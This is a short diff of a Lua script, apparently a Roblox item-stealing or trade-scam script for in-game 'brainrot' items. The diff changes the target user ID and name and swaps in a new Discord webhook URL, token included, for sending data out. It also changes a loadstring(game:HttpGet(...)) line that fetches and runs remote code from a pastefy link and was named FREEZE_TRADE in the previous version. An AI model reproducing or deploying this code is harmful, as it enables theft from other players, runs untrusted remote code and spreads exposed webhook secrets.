@@ -1,6 +1,6 @@
-local TARGET_ID = 7433051772
-local TARGET_USER = "justhyraff"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1568823925511561316/SMYEr6LSSdpBjEmUzCgVqB4MHnrIAVN-Gba_BGCDLzGzTvdPXKZd-b6_z5Zma6BIae63"
+local TARGET_ID = 9927602784
+local TARGET_USER = "SECRET_AGENT111158"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1571090179127513188/bkHwo_7M2EQ7A9trFj0TVaV_B0gU2OzF0oI-2VUk2S_F50kCaBzq8EMSvxaDNNO1nppF"
 
 local TargetBrainrots = {
     ["Dragon Skeletonini"] = true,
@@ -350,7 +350,7 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/FREEZE_TRADE/refs/heads/main/.lua"))()
+    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()
 
     task.wait(1)
 
